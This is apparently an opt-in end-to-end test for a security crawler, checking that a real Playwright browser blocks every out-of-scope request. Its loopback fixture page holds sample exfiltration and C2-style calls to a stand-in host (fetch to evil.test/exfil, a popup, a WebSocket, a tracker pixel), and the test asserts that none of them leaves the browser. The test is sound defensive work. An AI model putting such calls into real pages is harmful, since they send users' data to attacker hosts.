import { strict as assert } from 'node:assert';
import { createServer, type Server } from 'node:http';
import { type AddressInfo } from 'node:net';
import { after, before, test } from 'node:test';

import { createLogger } from '@corvid/logger';
import type { ScopeRules } from '@corvid/scope';

import {
  type AuditSink,
  type CrawlAuditEntry,
  crawl,
  type CrawlParams,
  type Frontier,
  type FrontierItem,
} from '../src/crawl.ts';
import { PlaywrightFetcher } from '../src/fetch.ts';

// Opt-in end-to-end test proving the REAL Playwright fetcher aborts out-of-scope requests before
// they leave the browser. Requires a Chromium browser (`playwright install chromium`) and is gated
// behind CRAWLER_E2E so `pnpm turbo run test` on a bare machine stays green.
//
// The scope validator refuses loopback/localhost hosts, so the fixture can't be scoped as
// 127.0.0.1. Instead Chromium's --host-resolver-rules maps fake hostnames (app.test / evil.test /
// tracker.test) to the loopback fixture. Scope is `app.test` only; the fixture records EVERY request
// it actually receives. The safety proof: it must never receive an evil.test / tracker.test request.

if (process.env.CRAWLER_E2E === undefined) {
  test('crawler e2e (skipped — set CRAWLER_E2E=1 with chromium installed to run)', { skip: true }, () => {
    // intentionally empty
  });
} else {
  runE2E();
}

class InMemoryFrontier implements Frontier {
  readonly #seen = new Set<string>();
  readonly #queue: FrontierItem[] = [];
  async enqueue(items: readonly FrontierItem[]): Promise<number> {
    let n = 0;
    for (const item of items) {
      if (!this.#seen.has(item.url)) {
        this.#seen.add(item.url);
        this.#queue.push(item);
        n++;
      }
    }
    return n;
  }
  async dequeue(): Promise<FrontierItem | null> {
    return this.#queue.shift() ?? null;
  }
}

class RecordingAudit implements AuditSink {
  readonly entries: CrawlAuditEntry[] = [];
  async append(entry: CrawlAuditEntry): Promise<void> {
    this.entries.push(entry);
  }
}

function runE2E(): void {
  const logger = createLogger({ level: 'silent', service: 'crawler-e2e' });
  let server: Server;
  let port: number;
  const hits: string[] = [];

  before(async () => {
    server = createServer((req, res) => {
      hits.push(`${req.headers.host ?? '?'}${req.url ?? ''}`);
      const path = (req.url ?? '/').split('?')[0];
      if (path === '/') {
        res.setHeader('content-type', 'text/html');
        res.end(`<!doctype html><html><body>
          <a href="/dashboard">dash</a>
          <a href="http://evil.test:${port}/steal">leak</a>
          <img src="http://tracker.test:${port}/pixel">
          <form action="/session" method="post">
            <input name="email" type="email">
            <input name="password" type="password">
          </form>
          <script>
            fetch('/api/me');
            fetch('http://evil.test:${port}/exfil');
            // C2 bypass attempts: a popup and a WebSocket to an out-of-scope host.
            try { window.open('http://evil.test:${port}/popup'); } catch (e) {}
            try { new WebSocket('ws://evil.test:${port}/ws'); } catch (e) {}
          </script>
        </body></html>`);
        return;
      }
      if (path === '/dashboard') {
        res.setHeader('content-type', 'text/html');
        res.end('<!doctype html><html><body><h1>dash</h1></body></html>');
        return;
      }
      if (path === '/api/me') {
        res.setHeader('content-type', 'application/json');
        res.end('{}');
        return;
      }
      res.statusCode = 404;
      res.end('not found');
    });
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    port = (server.address() as AddressInfo).port;
  });

  after(async () => {
    await new Promise<void>((resolve, reject) =>
      server.close((err) => (err ? reject(err) : resolve())),
    );
  });

  test('real browser maps the in-scope surface and never sends an out-of-scope request', async () => {
    const rules = [
      `MAP app.test 127.0.0.1`,
      `MAP evil.test 127.0.0.1`,
      `MAP tracker.test 127.0.0.1`,
    ].join(',');
    const fetcher = await PlaywrightFetcher.launch({
      browserArgs: [`--host-resolver-rules=${rules}`],
      networkIdleTimeoutMs: 2000,
    });

    try {
      const crawlParams: CrawlParams = {
        scanId: '00000000-0000-0000-0000-0000000000e2',
        targetUrl: `http://app.test:${port}/`,
        maxPages: 50,
        maxDepth: 5,
      };
      const scope: ScopeRules = { hosts: ['app.test'] };
      const audit = new RecordingAudit();
      const result = await crawl(crawlParams, scope, {
        fetcher,
        frontier: new InMemoryFrontier(),
        audit,
        logger,
      });

      // --- Surface mapped ---
      const urls = result.endpoints.map((e) => e.url);
      assert.ok(urls.includes(`http://app.test:${port}/`), 'root navigation mapped');
      assert.ok(urls.includes(`http://app.test:${port}/dashboard`), 'in-scope link followed');
      assert.ok(urls.includes(`http://app.test:${port}/api/me`), 'in-scope xhr mapped');
      const session = result.endpoints.find((e) => e.url === `http://app.test:${port}/session`);
      assert.equal(session?.method, 'POST', 'form endpoint mapped as POST');
      assert.equal(result.authFlows[0]?.kind, 'form_login', 'login form detected');

      // --- No out-of-scope request ever left the browser (THE safety property) ---
      const outOfScopeHit = hits.find(
        (h) => h.startsWith('evil.test') || h.startsWith('tracker.test'),
      );
      assert.equal(outOfScopeHit, undefined, `fixture must never receive an out-of-scope request, got ${outOfScopeHit ?? ''}`);
      assert.ok(
        !hits.some(
          (h) =>
            h.includes('/steal') ||
            h.includes('/pixel') ||
            h.includes('/exfil') ||
            h.includes('/popup') ||
            h.includes('/ws'),
        ),
        'popup navigation and WebSocket to an out-of-scope host must also be blocked (C2)',
      );

      // --- No out-of-scope host or endpoint in the map ---
      assert.ok(!urls.some((u) => u.includes('evil.test') || u.includes('tracker.test')));
      assert.ok(result.stats.skippedOutOfScope > 0, 'out-of-scope attempts were counted');
    } finally {
      await fetcher.close();
    }
  });
}
